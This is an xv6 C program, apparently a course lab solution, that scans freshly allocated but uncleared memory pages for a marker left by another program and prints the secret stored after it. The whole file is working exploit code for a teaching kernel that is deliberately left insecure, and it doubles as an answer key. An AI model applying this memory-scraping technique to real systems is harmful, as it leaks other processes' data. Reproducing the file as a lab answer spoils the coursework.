#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
  char marker[15];
  int size = 32 * PGSIZE;
  char *memory = sbrk(size);

  // Build the marker at run time so a copy is not embedded in attack's own
  // read-only data and later mistaken for the bytes left behind by secret.
  marker[0] = 'T'; marker[1] = 'h'; marker[2] = 'i'; marker[3] = 's';
  marker[4] = ' '; marker[5] = 'm'; marker[6] = 'a'; marker[7] = 'y';
  marker[8] = ' '; marker[9] = 'h'; marker[10] = 'e'; marker[11] = 'l';
  marker[12] = 'p'; marker[13] = '.'; marker[14] = 0;

  if(memory == SBRK_ERROR)
    exit(1);

  // The syscall lab deliberately leaves newly allocated pages uncleared.
  // Locate secret.c's marker in recycled physical memory; the secret starts
  // at byte offset 16 in the same data array.
  for(int i = 0; i + 24 < size; i++) {
    int valid = 1;
    for(int j = 0; j < 8; j++) {
      char c = memory[i + 16 + j];
      if(!((c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z') ||
           (c >= 'a' && c <= 'z')))
        valid = 0;
    }
    if(valid && memcmp(memory + i, marker, sizeof(marker) - 1) == 0) {
      printf("%s\n", memory + i + 16);
      exit(0);
    }
  }

  exit(1);
}
